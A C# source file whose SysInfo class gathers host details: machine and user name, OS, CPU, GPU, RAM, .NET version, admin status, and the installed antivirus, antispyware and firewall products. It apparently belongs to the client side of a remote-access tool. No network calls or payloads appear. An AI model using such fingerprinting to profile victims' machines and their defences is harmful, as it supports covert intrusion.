using Microsoft.Win32;
using System;
using System.Management;
using System.Reflection;
using System.Security.Principal;

namespace Client.Utils
{
    internal static class SysInfo
    {
        internal static readonly string PC = Environment.MachineName;
        internal static readonly string UserName = Environment.UserName;
        internal static readonly string Application = Assembly.GetExecutingAssembly().Location;
        internal static readonly string AntiVirus = MOB(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct", "displayName");
        internal static readonly string AntiSpyware = MOB(@"root\SecurityCenter2", "SELECT * FROM AntiSpywareProduct", "displayName");
        internal static readonly string Firewall = MOB(@"root\SecurityCenter2", "SELECT * FROM FirewallProduct", "displayName");
        internal static readonly string OSArchitecture = MOB("SELECT * FROM Win32_OperatingSystem", "OSArchitecture");
        internal static readonly string GPU1 = MOB("SELECT * FROM Win32_VideoController", "Name");
        internal static readonly string GPU2 = MOB("SELECT * FROM Win32_DisplayConfiguration", "Description");
        internal static readonly string RAM = Math.Round(Convert.ToDouble(MOB("SELECT * FROM Win32_OperatingSystem", "TotalVisibleMemorySize")) / (0x400 * 0x400), 0x2).ToString();
        internal static readonly string DOTNET = DotNet(RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey(@"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\"));
        internal static readonly string Privilege = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) == true ? "Admin" : "User";
        internal static readonly string OS = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion", "ProductName", null);
        internal static readonly string CPU = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree).GetValue("ProcessorNameString").ToString();

        private static string MOB(string _Scope, string _Query_String, string _Name)
        {
            using (ManagementObjectSearcher _MOB = new ManagementObjectSearcher(_Scope, _Query_String))
            {
                foreach (ManagementObject _Data in _MOB.Get())
                    return _Data[_Name].ToString();
            }
            return "";
        }

        private static string MOB(string _Query_String, string _Name)
        {
            using (ManagementObjectSearcher _MOB = new ManagementObjectSearcher(_Query_String))
            {
                foreach (ManagementObject _Data in _MOB.Get())
                    return _Data[_Name].ToString();
            }
            return "";
        }

        private static string DotNet(RegistryKey _Key)
        {
            if (!_Key.GetValue("Release").Equals(null))
                return $".NET Framework Version: {GetVersion((int)_Key.GetValue("Release"))}";
            else
                return ".NET Framework Version 4.5 or later is not detected.";

            string GetVersion(int _Release_Key)
            {
                if (_Release_Key >= 528040)
                    return "4.8 or later";
                else if (_Release_Key >= 460798)
                    return "4.7";
                else if (_Release_Key >= 393295)
                    return "4.6";
                else if (_Release_Key >= 378389)
                    return "4.5";
                else
                    return "No 4.5 or later version detected";
            }
        }
    }
}